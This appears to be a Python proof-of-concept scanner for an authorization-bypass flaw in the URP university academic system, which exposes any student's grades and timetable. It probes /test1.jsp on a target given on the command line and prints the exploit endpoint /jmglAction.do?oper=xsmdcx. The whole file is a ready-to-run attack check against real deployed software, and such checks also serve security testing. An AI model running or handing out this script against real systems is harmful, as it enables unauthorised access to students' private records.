#!/usr/bin/env python
# -*- coding: utf-8 -*- 
'''
name: URP越权查看任意学生课表、成绩(需登录)
referer: http://www.wooyun.org/bugs/wooyun-2010-099950
author: Lucifer
description: 系统存在一个越权漏洞，登录之后可以通过姓名或学号查看任意学生成绩和课表。
'''
import sys
import requests
import warnings
from termcolor import cprint

class urp_query2_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        payload = "/test1.jsp"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, timeout=10, verify=False)

            if r"jmglAction.do" in req.text:
                cprint("[+]存在URP越权查看任意学生课表、成绩(需登录)漏洞...(中危)\tpayload: "+vulnurl, "yellow")
                cprint("[+]存在URP越权查看任意学生课表、成绩(需登录)漏洞...(中危)\tpayload: "+self.url+"/jmglAction.do?oper=xsmdcx", "yellow")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = urp_query2_BaseVerify(sys.argv[1])
    testVuln.run()
